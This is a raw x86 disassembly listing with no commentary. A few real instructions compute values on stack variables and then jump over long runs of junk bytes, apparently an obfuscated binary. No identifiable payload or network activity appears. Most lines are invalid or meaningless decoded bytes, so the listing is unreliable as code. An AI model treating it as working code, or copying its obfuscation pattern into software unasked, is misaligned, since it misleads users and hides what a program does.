  410ffd:	mov    ds:0x583ef39c,eax
  411002:	and    al,0xbf
  411004:	aas    
  411005:	call   0x9df68a0b
  41100a:	(bad)  
  41100b:	adc    edi,DWORD PTR ds:0x9873aaf
  411011:	cmc    
  411012:	add    ch,bl
  411014:	loope  0x410ff7
  411016:	sub    al,0x19
  411018:	cwde   
  411019:	into   
  41101a:	stos   BYTE PTR es:[edi],al
  41101b:	fimul  WORD PTR [eax+0x66]
  41101e:	js     0x411069
  411020:	cld    
  411021:	inc    edx
  411022:	inc    edi
  411023:	fnstcw WORD PTR [esi-0x19fdde55]
  411029:	push   ebp
  41102a:	nop
  41102b:	pop    eax
  41102c:	sbb    BYTE PTR [ecx-0x239cb61],0xc7
  411033:	out    dx,al
  411034:	iret   
  411035:	pop    es
  411036:	out    dx,al
  411037:	stc    
  411038:	fwait
  411039:	dec    DWORD PTR [ebx+ebx*2]
  41103c:	mov    ds:0x67aeeda5,eax
  411041:	out    dx,eax
  411042:	sbb    eax,0x45c7d5a9
  411047:	aam    0x7d
  411049:	and    al,0x0
  41104b:	add    bh,al
  41104d:	inc    ebp
  41104e:	int3   
  41104f:	adc    DWORD PTR [esi],ebx
  411051:	add    BYTE PTR [eax],al
  411053:	jmp    0x41112f
  411058:	mov    edx,0xfbbce2c3
  41105d:	mov    ebp,0x69ffc7fe
  411062:	jno    0x4110b2
  411064:	mov    ah,0x24
  411066:	pop    ecx
  411067:	(bad)  
  411068:	mov    dl,0xb9
  41106a:	add    BYTE PTR [eax],al
  41106c:	mov    edi,0x9d000000
  411071:	lahf   
  411072:	inc    eax
  411073:	push   DWORD PTR [ecx]
  411075:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411076:	pop    ds
  411077:	mov    al,ds:0x7a93b4f2
  41107c:	repnz repnz lea eax,[edi+0x22f91a57]
  411084:	pop    ss
  411085:	imul   edx,DWORD PTR [esi+0x46],0x36
  411089:	jnp    0x41103b
  41108b:	ja     0x41108f
  41108d:	sub    edi,DWORD PTR [eax+0x1215bc8d]
  411093:	loop   0x411069
  411095:	dec    esp
  411096:	pop    ds
  411097:	cmp    eax,0x85b9615f
  41109c:	call   0x11132c0b
  4110a1:	cwde   
  4110a2:	mov    fs,WORD PTR [edx]
  4110a4:	mov    DWORD PTR [esi],0x88478ba5
  4110aa:	adc    eax,0xbbdc01d5
  4110af:	mov    eax,ds:0xdb955146
  4110b4:	push   eax
  4110b5:	imul   edx,DWORD PTR [eax],0xbe59a807
  4110bb:	cmc    
  4110bc:	ficom  WORD PTR [esi]
  4110be:	or     BYTE PTR [ebp+0x24],ah
  4110c1:	ror    BYTE PTR [edi],cl
  4110c3:	add    eax,0x8525fe9d
  4110c8:	push   ebp
  4110c9:	fstp   st(2)
  4110cb:	aad    0xc5
  4110cd:	xor    bl,BYTE PTR [ecx]
  4110cf:	and    dh,al
  4110d1:	mov    edx,0x9d39ca61
  4110d6:	pop    ebx
  4110d7:	and    BYTE PTR [ecx],dh
  4110d9:	ror    BYTE PTR [ebx-0x1226561f],0x94
  4110e0:	sbb    DWORD PTR [ebx+eiz*8+0x7a01bce5],ecx
  4110e7:	adc    edx,DWORD PTR [esi]
  4110e9:	inc    ebp
  4110ea:	xor    eax,0x97de82ba
  4110ef:	adc    bl,ah
  4110f1:	jo     0x41107d
  4110f3:	dec    ecx
  4110f4:	sub    eax,0xcb24fd35
  4110f9:	test   DWORD PTR [edi+0x6e],0xd077e6a2
  411100:	clc    
  411101:	xor    ebx,DWORD PTR [eax+eax*4]
  411104:	cmp    al,0x85
  411106:	mov    ecx,0x370e6ab9
  41110b:	or     al,0x38
  41110d:	aad    0x8f
  41110f:	mov    gs,WORD PTR [edx-0x6a]
  411112:	xchg   esp,eax
  411113:	pop    edi
  411114:	mov    ch,0xf
  411116:	xor    dh,BYTE PTR [eax+0x496ede1a]
  41111c:	clc    
  41111d:	test   dh,dl
  41111f:	ret    
  411120:	iret   
  411121:	sub    bl,BYTE PTR ds:0x6ba46faf
  411127:	mov    edi,0xd1b9a023
  41112c:	in     al,dx
  41112d:	pop    es
  41112e:	popa   
  41112f:	mov    eax,DWORD PTR [ebp-0x48]
  411132:	mov    ecx,DWORD PTR [ebp-0x44]
  411135:	imul   eax,eax,0x7f33
  41113b:	sub    eax,0x54a0
  411140:	xor    edx,edx
  411142:	div    ecx
  411144:	mov    ecx,DWORD PTR [ebp-0x40]
  411147:	sub    eax,ecx
  411149:	mov    ecx,DWORD PTR [ebp-0x3c]
  41114c:	lea    ecx,[eax+ecx*1-0x6ccb]
  411153:	mov    eax,DWORD PTR [ebp-0x34]
  411156:	jmp    0x411232
  41115b:	pop    ecx
  41115c:	stos   BYTE PTR es:[edi],al
  41115d:	sbb    al,0x41
  41115f:	push   edi
  411161:	pop    ebp
  411162:	mov    edx,0x923706de
  411167:	pop    es
  411168:	scas   eax,DWORD PTR es:[edi]
  411169:	xor    cl,BYTE PTR ds:0xba71
  41116f:	mov    edi,0xfc000000
  411174:	nop
  411175:	(bad)  
  411176:	hlt    
  411177:	mov    edx,0xc18c258c
  41117c:	mov    ebx,DWORD PTR [ebx+0x4c]
  41117f:	clc    
  411180:	adc    ecx,DWORD PTR [eax-0x33]
  411183:	dec    ebp
  411184:	mov    edi,0x8581ac05
  411189:	das    
  41118a:	sbb    BYTE PTR [esi+eax*2-0x41],cl
  41118e:	xor    ah,BYTE PTR [edi+0x18]
  411191:	dec    edx
  411192:	mov    eax,ds:0x8eacc047
  411197:	mov    bh,0x2a
  411199:	mov    ds:0xa4efec27,al
  41119e:	test   DWORD PTR [edi+0x3cfd76fe],esi
  4111a4:	ret    0x8577
  4111a7:	fs push eax
  4111a9:	icebp  
  4111aa:	test   eax,0xd1ad54a8
  4111af:	push   ebp
  4111b0:	pusha  
  4111b1:	and    esp,edi
  4111b3:	adc    eax,0xfac2ba64
  4111b8:	and    eax,0x197058e2
  4111bd:	jecxz  0x4111d0
  4111bf:	adc    cl,ah
  4111c1:	rcl    BYTE PTR [ecx+eiz*1],1
  4111c4:	mov    ah,0x84
  4111c6:	cwd    
  4111c8:	jbe    0x41121b
  4111ca:	test   DWORD PTR [eax-0x6a],eax
  4111cd:	(bad)  
  4111ce:	cwde   
  4111cf:	mov    ds:0xe17f00a4,eax
  4111d4:	fistp  DWORD PTR [ebp+0x625b3ecf]
  4111da:	loope  0x4111ac
  4111dc:	in     eax,dx
  4111dd:	xor    edi,esp
  4111df:	push   ds
  4111e0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4111e1:	(bad)  
  4111e2:	or     DWORD PTR [eax-0x86d6ee1],edi
  4111e8:	jo     0x411197
  4111ea:	lds    ebx,FWORD PTR [eax-0x26523ee3]
  4111f0:	retf   0x9cc8
  4111f3:	hlt    
  4111f4:	jno    0x411261
  4111f6:	(bad)  
  4111f8:	jp     0x41122b
  4111fa:	dec    edi
  4111fb:	and    eax,0x9914698c
  411200:	loopne 0x4111d6
  411202:	push   0x4c
  411204:	pop    ds
  411205:	addr16 xchg ebp,eax
  411207:	fucomp st(3)
  411209:	rol    BYTE PTR [eax+0x75],0xbc
  41120d:	push   edx
  41120e:	mov    ecx,0xbff793df
  411213:	ins    DWORD PTR es:[edi],dx
  411214:	test   eax,0xfc98e0df
  411219:	add    BYTE PTR cs:[eax+0x30821538],ah
  411220:	cmp    dh,cl
  411222:	test   eax,0xd5d79a35
  411227:	and    ch,dh
  411229:	call   0x3b7ae6a7
  41122e:	ja     0x4111dc
  411230:	jnp    0x4111f4
  411232:	mov    edx,DWORD PTR [ebp-0x2c]
  411235:	add    eax,0xd8
  41123a:	or     eax,0xfffffe11
  41123f:	jmp    0x41131b
  411244:	rcr    ch,0x64
  411247:	cmp    DWORD PTR [ebp-0x47],edi
  41124a:	(bad)  
  41124c:	repnz adc al,0x74
  41124f:	int    0xd5
  411251:	sti    
  411252:	dec    eax
  411253:	(bad)  
  411254:	xor    BYTE PTR [ebx+0xbf0000],bh
  41125a:	add    BYTE PTR [eax],al
  41125c:	not    DWORD PTR [ebp+0x16337efa]
  411262:	jl     0x411297
  411264:	out    dx,eax
  411265:	rcl    BYTE PTR [edi-0x680bee39],0x10
  41126c:	sub    al,0x6e
  41126e:	and    al,BYTE PTR [edx]
  411270:	arpl   WORD PTR [edi+0x479daae5],bp
  411276:	push   edi
  411277:	ror    BYTE PTR [edi-0x6248d4f0],cl
  41127d:	xor    BYTE PTR [ebx],ch
  41127f:	lea    esi,[ebx]
  411281:	mov    edi,0x8e4747be
  411286:	idiv   BYTE PTR [edi+0x23dfdc01]
  41128c:	pop    ebx
  41128d:	jo     0x411287
  41128f:	mov    edx,fs
  411291:	pop    es
  411292:	aad    0x2
  411294:	xchg   edx,eax
  411295:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411296:	out    dx,al
  411297:	mov    bh,al
  411299:	jle    0x411317
  41129b:	pop    esi
  41129c:	test   DWORD PTR [esi+0x3b],edi
  41129f:	outs   dx,DWORD PTR ds:[esi]
  4112a0:	sub    DWORD PTR [ebx+esi*4],ecx
  4112a3:	lods   eax,DWORD PTR ds:[esi]
  4112a4:	or     eax,0x445e10ea
  4112a9:	stc    
  4112aa:	inc    ecx
  4112ab:	and    BYTE PTR [ecx],al
  4112ad:	jge    0x41129b
  4112af:	shr    BYTE PTR [edx+0x59],cl
  4112b2:	int    0x4c
  4112b4:	daa    
  4112b5:	scas   al,BYTE PTR es:[edi]
  4112b6:	pop    ebp
  4112b7:	scas   al,BYTE PTR es:[edi]
  4112b8:	arpl   bp,cx
  4112ba:	clc    
  4112bb:	sbb    ecx,DWORD PTR [edi-0x2da8cd99]
  4112c1:	imul   DWORD PTR [edi+esi*1]
  4112c4:	bound  ecx,QWORD PTR [ebx+0x70]
  4112c7:	add    ah,bh
  4112c9:	addr16 pop ecx
  4112cb:	js     0x41129c
  4112cd:	and    BYTE PTR [ebp+0x45b03cc1],0x9d
  4112d4:	dec    esi
  4112d5:	shl    DWORD PTR [eax+0x30],0x67
  4112d9:	ja     0x4112b4
  4112db:	push   ebp
  4112dc:	sti    
  4112dd:	pushf  
  4112de:	mov    eax,0xdcecfb64
  4112e3:	retf   0xc93b
  4112e6:	test   eax,0x7890780c
  4112eb:	inc    ecx
  4112ec:	ret    
  4112ed:	daa    
  4112ee:	mov    ah,0x88
  4112f0:	(bad)  
  4112f2:	scas   eax,DWORD PTR es:[edi]
  4112f3:	sti    
  4112f4:	into   
  4112f5:	ins    DWORD PTR es:[edi],dx
  4112f6:	mov    ch,BYTE PTR ds:0xe71db95e
  4112fc:	mov    cl,0xee
  4112fe:	scas   al,BYTE PTR es:[edi]
  4112ff:	mov    ebp,0xc81cf844
  411304:	push   ss
  411305:	sbb    BYTE PTR [edi+0x2f],ah
  411308:	lea    eax,[ecx+0x3a]
  41130b:	aaa    
  41130c:	inc    ebp
  41130d:	loope  0x411348
  41130f:	cmp    al,0x55
  411311:	js     0x4112f8
  411313:	push   0xcbb23e0a
  411318:	adc    al,0xfa
  41131a:	dec    edi
  41131b:	sub    eax,edx
  41131d:	mov    edx,DWORD PTR [ebp-0x4]
  411320:	jmp    0x4113fc
  411325:	cli    
  411326:	push   eax
  411327:	jbe    0x411387
  411329:	(bad)  
  41132a:	jle    0x411326
  41132c:	hlt    
  41132d:	sbb    ebp,DWORD PTR [esi]
  41132f:	jae    0x41133e
  411331:	(bad)  
  411332:	idiv   BYTE PTR [ebp-0x6b]
  411335:	out    dx,eax
  411336:	mov    ebx,0xbf0000
  41133b:	add    BYTE PTR [eax],al
  41133d:	sbb    bh,BYTE PTR ss:[ebx]
  411340:	loopne 0x411358
  411342:	xchg   ebx,eax
  411343:	das    
  411344:	xchg   ecx,eax
  411345:	inc    ecx
  411346:	xchg   ecx,ebx
  411348:	jmp    edi
  41134a:	jge    0x41136b
  41134c:	pop    es
  41134d:	cmps   BYTE PTR fs:[esi],BYTE PTR es:[edi]
  41134f:	add    BYTE PTR [ebx],0x81
  411352:	rcl    DWORD PTR [ebp-0x7843df79],0xc1
  411359:	pop    es
  41135a:	ret    0x1615
  41135d:	lods   eax,DWORD PTR ds:[esi]
  41135e:	fcmovnb st,st(6)
  411360:	pop    esi
  411361:	sub    cl,al
  411363:	adc    eax,0xcc101f1f
  411368:	push   ecx
  411369:	(bad)  
  41136a:	and    edi,DWORD PTR [eax-0x5f]
  41136d:	sub    ch,ch
  41136f:	rol    BYTE PTR [esi],0x6d
  411372:	jmp    0x4113e8
  411374:	sti    
  411375:	or     BYTE PTR [ecx-0x26ada250],dl
  41137b:	push   eax
  41137c:	add    al,0x1d
  41137e:	or     dh,al
  411380:	cwde   
  411381:	call   0xe419:0x80255e4b
  411388:	add    DWORD PTR ds:0xbe5d1a0d,0xb58fc89a
  411392:	mov    ds:0xe25bbb8f,eax
  411397:	xchg   edi,eax
  411398:	cmp    BYTE PTR [esi-0x45c12871],0xc0
  41139f:	rcl    ah,1
  4113a1:	jo     0x4113bb
  4113a3:	inc    ebp
  4113a4:	inc    esi
  4113a5:	je     0x4113ab
  4113a7:	icebp  
  4113a8:	shl    DWORD PTR [ecx-0x6],0x7a
  4113ac:	jp     0x411424
  4113ae:	leave  
  4113af:	fld    TBYTE PTR [edx]
  4113b1:	push   es
  4113b2:	jmp    0x411416
  4113b4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4113b5:	sbb    ebp,ecx
  4113b7:	inc    ax
  4113b9:	mov    al,ds:0xee695c29
  4113be:	push   edi
  4113bf:	mov    ebp,0xd9bfe064
  4113c4:	repnz out 0x5b,al
  4113c7:	sub    al,0xdd
  4113c9:	pop    eax
  4113ca:	dec    eax
  4113cb:	in     al,dx
  4113cc:	outs   dx,BYTE PTR ds:[esi]
  4113cd:	dec    ebp
  4113ce:	xchg   edi,eax
  4113cf:	cld    
  4113d0:	and    al,0x42
  4113d2:	jb     0x4113a4
  4113d4:	adc    cl,0x3b
  4113d7:	shr    DWORD PTR [esi],0x26
  4113da:	ficomp DWORD PTR [ebx-0x7a]
  4113dd:	mov    ah,0x90
  4113df:	sub    ebx,DWORD PTR [ecx]
  4113e1:	jmp    0x656f:0x42ed609e
  4113e8:	(bad)  
  4113e9:	jns    0x4113b7
  4113eb:	nop
  4113ec:	bound  eax,QWORD PTR [ecx-0x52d549f0]
  4113f2:	xchg   BYTE PTR [eax+0x8c0a2fa],al
  4113f8:	inc    ecx
  4113f9:	sbb    ah,BYTE PTR [edx+edx*2]
  4113fc:	and    eax,0x4d7
  411401:	add    eax,DWORD PTR [ecx+edx*1]
  411404:	jmp    0x4114e0
  411409:	data16 fimul DWORD PTR [eax]
  41140c:	(bad)  
  41140d:	mov    esp,0xcefbefd7
  411412:	dec    eax
  411413:	pop    esi
  411414:	pop    edi
  411415:	icebp  
  411416:	push   cs
  411417:	nop
  411418:	pop    ecx
  411419:	scas   al,BYTE PTR es:[edi]
  41141a:	mov    esp,0xbf0000
  41141f:	add    BYTE PTR [eax],al
  411421:	inc    esp
  411422:	mov    al,ds:0xde91e0ba
  411427:	cli    
  411428:	sub    eax,0x1127305a
  41142d:	sub    ch,bh
  41142f:	into   
  411430:	cmc    
  411431:	aam    0x69
  411433:	lock stos DWORD PTR es:[edi],eax
  411435:	inc    edx
  411436:	dec    ebp
  411437:	(bad)  
  411439:	ret    
  41143a:	inc    esp
  41143b:	jecxz  0x411490
  41143d:	ins    BYTE PTR es:[edi],dx
  41143e:	jnp    0x411486
  411440:	in     eax,dx
  411441:	call   0x9e66:0xa269efca
  411448:	lds    ebx,FWORD PTR [eax]
  41144a:	cld    
  41144b:	stos   DWORD PTR es:[edi],eax
  41144c:	pop    es
  41144d:	xchg   edx,eax
  41144e:	stos   BYTE PTR es:[edi],al
  41144f:	and    ch,al
  411451:	out    dx,al
  411452:	pop    ss
  411453:	dec    esp
  411454:	xchg   BYTE PTR [esp+esi*4+0x4e],ah
  411458:	xlat   BYTE PTR ds:[ebx]
  411459:	inc    ecx
  41145a:	add    BYTE PTR [ebp-0x2e],ch
  41145d:	cwde   
  41145e:	add    al,bh
  411460:	iret   
  411461:	cld    
  411462:	or     ebp,ecx
  411464:	mov    ds:0x96c1aac0,al
  411469:	jns    0x4114a3
  41146b:	bnd jb 0x411445
  41146e:	dec    ebx
  41146f:	add    BYTE PTR [esi-0x43],bh
  411472:	jle    0x4114b2
  411474:	leave  
  411475:	cmp    al,BYTE PTR [edi-0x1a]
  411478:	mov    WORD PTR [ecx+0x2cb672fd],cs
  41147e:	sub    DWORD PTR [ebp-0x40],ebp
  411481:	adc    al,0x28
  411483:	jne    0x411429
  411485:	cli    
  411486:	clc    
  411487:	mov    eax,ds:0x7dcc4625
  41148c:	adc    DWORD PTR [edi],edx
  41148e:	out    0x97,al
  411490:	mov    ebx,edx
  411492:	sub    ebp,0x3b
  411495:	call   0x22e5202d
  41149a:	cld    
  41149b:	fdiv   QWORD PTR [eax-0x1f17a9de]
  4114a1:	icebp  
  4114a2:	or     DWORD PTR [ebp+0x60],ecx
  4114a5:	shr    eax,0xfd
  4114a8:	in     al,dx
  4114a9:	xchg   ecx,eax
  4114aa:	xor    BYTE PTR [ecx-0x78],dl
  4114ad:	les    ecx,FWORD PTR [edx+0x2a]
  4114b0:	xchg   ebp,eax
  4114b1:	and    BYTE PTR [eax+0x5f0740c2],0x68
  4114b8:	cmp    DWORD PTR [esi],ebx
  4114ba:	lods   eax,DWORD PTR ds:[esi]
  4114bb:	cmp    eax,0x900a8d1d
  4114c0:	repnz (bad) 
  4114c2:	aas    
  4114c3:	adc    al,0x14
  4114c5:	or     ecx,DWORD PTR [eax]
  4114c7:	enter  0xfe8b,0x58
  4114cb:	(bad)  
  4114cc:	pop    ebx
  4114cd:	dec    eax
  4114ce:	scas   eax,DWORD PTR es:[edi]
  4114cf:	cmc    
  4114d0:	pop    eax
  4114d1:	mov    ds,WORD PTR [esp+eax*4-0x762c61af]
  4114d8:	cmp    al,0xde
  4114da:	bound  ecx,QWORD PTR [eax+0x1]
  4114dd:	sbb    BYTE PTR gs:[ecx],bh
  4114e0:	mov    ecx,DWORD PTR [ebp-0x28]
  4114e3:	mov    edx,DWORD PTR [ebp-0x24]
  4114e6:	xor    ecx,0x14db
  4114ec:	sub    ecx,edx
  4114ee:	imul   ecx,ecx,0x3dd2
  4114f4:	add    ecx,eax
  4114f6:	mov    eax,DWORD PTR [ebp+0x8]
  4114f9:	lea    eax,[ecx+eax*1-0x663954e]
  411500:	mov    DWORD PTR [ebp-0x1c],eax
  411503:	jmp    0x4115df
  411508:	scas   al,BYTE PTR es:[edi]
  411509:	sub    bl,BYTE PTR [edx+0x2a]
  41150c:	fidivr WORD PTR [edx-0x2]
  41150f:	scas   al,BYTE PTR es:[edi]
  411510:	cmp    esi,DWORD PTR [esi+0x39585ff2]
  411516:	out    dx,eax
  411517:	je     0x411586
  411519:	mov    ebp,0xbf0000
  41151e:	add    BYTE PTR [eax],al
  411520:	dec    ecx
  411521:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411522:	cli    
  411523:	ins    DWORD PTR es:[edi],dx
  411524:	sub    esi,DWORD PTR [edi+0x52]
  411527:	mov    ds:0xb70ea81e,al
  41152c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41152d:	cmp    ah,dl
  41152f:	lods   eax,DWORD PTR ds:[esi]
  411530:	out    0x23,eax
  411532:	sub    edx,edx
  411534:	xor    DWORD PTR [edx+0x2e961c2b],edx
  41153a:	xor    ebp,0xfffffff4
  41153d:	fnstsw WORD PTR [ebx-0x30db1672]
  411543:	inc    edx
  411544:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411545:	fdivr  QWORD PTR [edi+eax*8+0x512c35ff]
  41154c:	(bad)  
  41154d:	fadd   DWORD PTR [ebx]
  41154f:	les    ebp,FWORD PTR [ecx]
  411551:	push   eax
  411552:	fwait
  411553:	inc    edi
  411554:	(bad)  [ebp*1-0x121a9cc2]
  41155b:	sub    eax,0x37ec230c
  411560:	mov    al,ds:0x31878146
  411565:	mov    fs,WORD PTR [ecx-0x33]
  411568:	pop    edx
  411569:	xor    al,0x99
  41156b:	mov    bh,0x10
  41156d:	comiss xmm6,DWORD PTR [edx-0x2a]
  411571:	out    dx,al
  411572:	mov    eax,0x824b5dda
  411577:	popa   
  411578:	ins    DWORD PTR es:[edi],dx
  411579:	cli    
  41157a:	cmp    eax,0xbc103a27
  41157f:	sub    eax,0xdf201035
  411584:	mov    ds:0xb603daba,eax
  411589:	mov    eax,ds:0x56679480
  41158e:	jg     0x4115e1
  411590:	into   
  411591:	mov    ebp,DWORD PTR [edi]
  411593:	pop    edi
  411594:	push   esi
  411595:	scas   al,BYTE PTR es:[edi]
  411596:	ins    BYTE PTR es:[edi],dx
  411597:	(bad)
  41159a:	(bad)  
  41159c:	jmp    0xfbf4e6e6
  4115a1:	dec    ecx
  4115a2:	sbb    al,0x90
  4115a4:	outs   dx,BYTE PTR ds:[esi]
  4115a5:	mov    al,ds:0xfc94af71
  4115aa:	aaa    
  4115ab:	lds    edx,FWORD PTR [ecx-0x64]
  4115ae:	jecxz  0x411558
  4115b0:	mov    dl,0x14
  4115b2:	sbb    al,0xc0
  4115b4:	ror    BYTE PTR [edi-0x381b0d5e],1
  4115ba:	inc    ecx
  4115bb:	sub    BYTE PTR [edx+edi*1+0x6cf1f178],dh
  4115c2:	cwde   
  4115c3:	pop    eax
  4115c4:	iret   
  4115c5:	(bad)  [edi]
  4115c7:	lock imul ebx,DWORD PTR ds:[edi],0x2d
  4115cc:	push   0xa7c6e421
  4115d1:	int    0xf4
  4115d3:	mov    dh,0x16
  4115d5:	adc    dl,al
  4115d7:	repz sub DWORD PTR [edi+0x76],0xffffffa2
  4115dc:	mov    bl,0x26
  4115de:	pop    es
  4115df:	mov    DWORD PTR [ebp-0x20],0x3040
  4115e6:	mov    DWORD PTR [ebp-0x24],0x5e69
  4115ed:	jmp    0x4116c9
  4115f2:	bound  ebp,QWORD PTR [ebx-0x9120993]
  4115f8:	sti    
  4115f9:	mov    edi,0x60484ddd
  4115fe:	mov    eax,0x2ccde71b
  411603:	mov    esi,0xbf0000
  411608:	add    BYTE PTR [eax],al
  41160a:	sbb    eax,0x8b319060
  41160f:	add    eax,0x7b108edf
  411614:	sub    eax,0xd4e987e4
  411619:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41161a:	xchg   edx,eax
  41161b:	ss icebp 
  41161d:	in     eax,0xa2
  41161f:	jmp    0x411630
  411621:	or     ecx,DWORD PTR [edx]
  411623:	test   eax,0xa52c814b
  411628:	pop    DWORD PTR [edx]
  41162a:	sub    al,0xab
  41162c:	fcomp  DWORD PTR [ebp+ebp*1+0x3a]
  411630:	sbb    dl,BYTE PTR [ebx-0x4]
  411633:	pop    ebx
  411634:	push   esp
  411635:	adc    cl,BYTE PTR [ecx]
  411637:	cld    
  411638:	pop    ds
  411639:	sub    bl,BYTE PTR [ebp+0x2e65952c]
  41163f:	test   eax,0xa52ab55d
  411644:	lahf   
  411645:	pop    ds
  411646:	mov    bl,0xe6
  411648:	pop    ss
  411649:	lods   eax,DWORD PTR ds:[esi]
  41164a:	repz dec eax
  41164c:	xchg   edi,eax
  41164d:	mov    ebp,esp
  41164f:	ret    0x74d1
  411652:	add    al,0x2d
  411654:	sbb    eax,0xacb5c9fa
  411659:	imul   DWORD PTR [eax-0x737f7173]
  41165f:	js     0x411648
  411661:	daa    
  411662:	push   cs
  411663:	fwait
  411664:	test   BYTE PTR [ebx-0x12],dl
  411667:	or     al,0x54
  411669:	int3   
  41166a:	push   ds
  41166b:	inc    ebp
  41166c:	dec    ebx
  41166d:	push   ebx
  41166e:	in     eax,dx
  41166f:	inc    esp
  411670:	dec    esp
  411671:	popa   
  411672:	scas   al,BYTE PTR es:[edi]
  411673:	pusha  
  411674:	call   0x5253:0x47ba7872
  41167b:	mov    ecx,0x8ca3c1d8
  411680:	cmp    bh,0xb6
  411683:	dec    ecx
  411684:	xor    esp,edx
  411686:	push   ss
  411687:	or     eax,0xf4bde664
  41168c:	sbb    ah,0xbb
  41168f:	imul   esp,DWORD PTR [edx+ecx*8+0x14cd6dc8],0x6d
  411697:	inc    esi
  411698:	scas   al,BYTE PTR es:[edi]
  411699:	test   eax,0x875ba5a9
  41169e:	jp     0x411671
  4116a0:	push   edi
  4116a1:	fdivp  st(4),st
  4116a3:	aad    0x41
  4116a5:	xchg   edx,eax
  4116a6:	shl    BYTE PTR [eax],1
  4116a8:	mov    edi,0xe37fdc1a
  4116ad:	xchg   BYTE PTR [edx],ah
  4116af:	test   DWORD PTR [edx*2+0x72a7f9b7],ebp
  4116b6:	xor    eax,edi
  4116b8:	out    dx,eax
  4116b9:	sub    al,0x53
  4116bb:	test   eax,0x2acadbcd
  4116c0:	push   edi
  4116c1:	sahf   
  4116c2:	mov    esp,0x7ac06ab2
  4116c7:	xchg   ecx,eax
  4116c8:	dec    esi
  4116c9:	mov    DWORD PTR [ebp-0x28],0x6467
  4116d0:	mov    DWORD PTR [ebp-0x40],0x659e
  4116d7:	jmp    0x4117b3
  4116dc:	rol    BYTE PTR [eax+0x2afa22aa],1
  4116e2:	fdiv   st,st(2)
  4116e4:	inc    edi
  4116e5:	push   edx
  4116e6:	std    
  4116e7:	dec    esi
  4116e8:	pop    edx
  4116e9:	add    cl,dl
  4116eb:	jo     0x4116d8
  4116ed:	mov    esi,0xbf0000
  4116f2:	add    BYTE PTR [eax],al
  4116f4:	or     dl,BYTE PTR [ecx+esi*8]
  4116f7:	pop    esi
  4116f8:	iret   
  4116f9:	push   esi
  4116fa:	push   edx
  4116fb:	jo     0x4116e1
  4116fd:	outs   dx,DWORD PTR ds:[esi]
  4116fe:	xor    dl,BYTE PTR ds:0x69037ead
  411704:	jnp    0x411703
  411706:	push   eax
  411707:	arpl   WORD PTR [ebx],bx
  411709:	fnstsw WORD PTR [esi]
  41170b:	mov    fs,WORD PTR ds:0x77ae9891
  411711:	mov    dl,0xdf
  411713:	ror    dl,1
  411715:	data16 arpl WORD PTR [eax],bp
  411718:	mov    bh,0x28
  41171a:	fldcw  WORD PTR [ecx]
  41171c:	pop    edi
  41171d:	loope  0x411793
  41171f:	push   ecx
  411720:	and    ah,BYTE PTR [edx+0x5]
  411723:	call   0x12ae6105
  411728:	sbb    dh,dh
  41172a:	jg     0x41177b
  41172c:	scas   eax,DWORD PTR es:[edi]
  41172d:	(bad)  
  41172e:	cmp    ebx,DWORD PTR [ebx]
  411730:	dec    edi
  411731:	ret    
  411732:	outs   dx,DWORD PTR ds:[esi]
  411733:	int    0x43
  411735:	mov    al,ds:0x129ca49a
  41173a:	xchg   ecx,eax
  41173b:	aam    0x93
  41173d:	xchg   esi,eax
  41173e:	dec    ecx
  41173f:	cmp    eax,0x9ed55c22
  411744:	mov    edx,0x8acadddf
  411749:	xchg   esi,eax
  41174a:	call   0x32c6:0xf1f65df2
  411751:	cmp    bl,cl
  411753:	nop
  411754:	popf   
  411755:	leave  
  411756:	data16 je 0x411750
  411759:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41175a:	pop    esp
  41175b:	adc    DWORD PTR [eax+0x505d0c65],ecx
  411761:	pop    edi
  411762:	add    cl,BYTE PTR [ebp-0x1fd502f8]
  411768:	mov    al,dh
  41176a:	fbstp  TBYTE PTR [ebx]
  41176c:	xor    al,0x1c
  41176e:	mov    bl,BYTE PTR [eax-0x5fe85eac]
  411774:	rol    DWORD PTR [edi-0x494bf085],0xd9
  41177b:	adc    al,0xa3
  41177d:	or     eax,0x49247b51
  411782:	mov    DWORD PTR [ebp-0x6d],edx
  411785:	push   esi
  411786:	mov    cs,WORD PTR [esi-0xb]
  411789:	pop    es
  41178a:	mov    BYTE PTR [edx+0x69bcaf27],0xcf
  411791:	in     eax,dx
  411792:	pushf  
  411793:	shl    BYTE PTR [edi+0x53b70735],1
  411799:	push   ebp
  41179a:	fimul  WORD PTR [ecx-0x641ec293]
  4117a0:	mov    ebx,esp
  4117a2:	jb     0x41178a
  4117a4:	int3   
  4117a5:	bound  ebp,QWORD PTR [edi+eax*8-0x7f]
  4117a9:	mov    edx,0x9eb611ee
  4117ae:	dec    edx
  4117af:	gs push eax
  4117b1:	stos   BYTE PTR es:[edi],al
  4117b2:	mov    edi,0x384abc45
  4117b8:	add    BYTE PTR [eax],al
  4117ba:	mov    DWORD PTR [ebp-0x48],0x6112
  4117c1:	mov    DWORD PTR [ebp-0x2c],0xd9d
  4117c8:	jmp    0x4118a4
  4117cd:	test   DWORD PTR [eax+eax*8+0x57],eax
  4117d1:	rcl    edi,0x97
  4117d4:	(bad)  
  4117d5:	cli    
  4117d6:	xor    esi,DWORD PTR [edx+0x4f00c2a1]
  4117dc:	mov    edi,0xbfaa
  4117e1:	mov    edi,0x91000000
  4117e6:	mov    eax,ds:0x3ee2d070
  4117eb:	push   ss
  4117ec:	sar    BYTE PTR [ebp-0x5b],0x7f
  4117f0:	cs mov esi,0x5bc13fc3
  4117f6:	dec    edi
  4117f7:	mov    ?,WORD PTR [esi]
  4117f9:	out    dx,al
  4117fa:	aad    0x2e
  4117fc:	ja     0x4117dd
  4117fe:	mov    eax,ds:0xaf8dbe6
  411803:	or     esp,DWORD PTR [edx]
  411805:	lods   eax,DWORD PTR ds:[esi]
  411806:	pop    ss
  411807:	adc    ch,BYTE PTR [ebx+0x5e]
  41180a:	xchg   esp,eax
  41180b:	cmp    BYTE PTR [ebp+0x29ae2375],bl
  411811:	sub    esi,DWORD PTR [edx+0x69]
  411814:	xor    al,0x4f
  411816:	into   
  411817:	fst    QWORD PTR [edx-0x35]
  41181a:	sahf   
  41181b:	lods   al,BYTE PTR ds:[esi]
